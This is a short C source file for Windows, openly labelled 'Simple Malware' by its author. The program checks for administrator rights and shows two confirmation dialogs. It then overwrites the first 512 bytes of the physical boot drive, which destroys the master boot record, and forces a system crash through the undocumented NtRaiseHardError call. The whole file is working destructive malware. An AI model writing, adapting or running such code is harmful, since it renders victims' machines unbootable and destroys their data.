#include <Windows.h>
#include <basetsd.h>
#include <processthreadsapi.h>
#include <winnt.h>


extern NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
extern NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);


typedef enum _HARDERROR_RESPONSE_OPTION
{
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;

BOOL do_warnings(){
    if(MessageBoxW(NULL, L"This malware is no good, continue?", L"Warning", MB_YESNO | MB_ICONWARNING) == IDYES){
        if(MessageBoxW(NULL, L"SECOND WARNING\n\nThis malware is no good and will destroy your machine, continue?", L"Warning 2", MB_YESNO | MB_ICONWARNING) == IDYES){
            return TRUE;
        }
        else return FALSE;
    }
    else return FALSE;
}


BOOL check_if_perms(){
    OFSTRUCT st;
    HFILE file = OpenFile("C:\\Windows\\System32\\idk.sys", &st, OF_CREATE);
    if(file == HFILE_ERROR){
        return FALSE;
    }
    else {
        CloseHandle((HANDLE)file);
        DeleteFileW(L"C:\\Windows\\System32\\idk.sys");
        return TRUE;
    }
}


VOID _entry(){
    if(!check_if_perms()){
        MessageBoxW(NULL, L"Run This As Admin", L"Simple Malware", MB_OK | MB_ICONINFORMATION);
        ExitProcess(0);
    } 
    if(!do_warnings()) ExitProcess(0);;
    
    HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    WriteFile(hFile, "Simple Malware Written By Zvqle", 512, NULL, NULL);
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    ULONG response;
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, OptionShutdownSystem, &response);
}